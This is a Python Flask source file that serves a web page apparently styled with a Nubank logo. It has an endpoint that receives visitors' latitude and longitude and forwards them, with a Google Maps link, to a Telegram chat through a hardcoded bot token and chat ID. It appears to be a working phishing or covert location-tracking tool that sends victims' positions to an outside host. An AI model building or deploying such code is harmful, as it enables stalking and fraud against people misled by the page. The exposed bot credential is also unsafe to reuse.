from flask import Flask, request, render_template_string, send_from_directory
import requests
import os

app = Flask(__name__)

# Seu token e seu chat_id
TELEGRAM_BOT_TOKEN = '7715557687:AAHvJdcOYIqjIpGpBSsv66Irb9ViN5tZvMs'
TELEGRAM_CHAT_ID = '2063662084'

# Função para ler o arquivo HTML externo
def get_html_content():
    with open('../index.html', 'r', encoding='utf-8') as file:
        return file.read()

@app.route('/')
def home():
    html_content = get_html_content()
    return render_template_string(html_content)

@app.route('/nu-logo.png')
def serve_logo():
    return send_from_directory('..', 'nu-logo.png')

@app.route('/send_location', methods=['POST'])
def send_location():
    data = request.get_json()
    latitude = data.get('latitude')
    longitude = data.get('longitude')

    message = f"Nova localização recebida:\nLatitude: {latitude}\nLongitude: {longitude}\nGoogle Maps: https://maps.google.com/?q={latitude},{longitude}"

    requests.post(f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage', data={
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    })

    return 'ok', 200

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
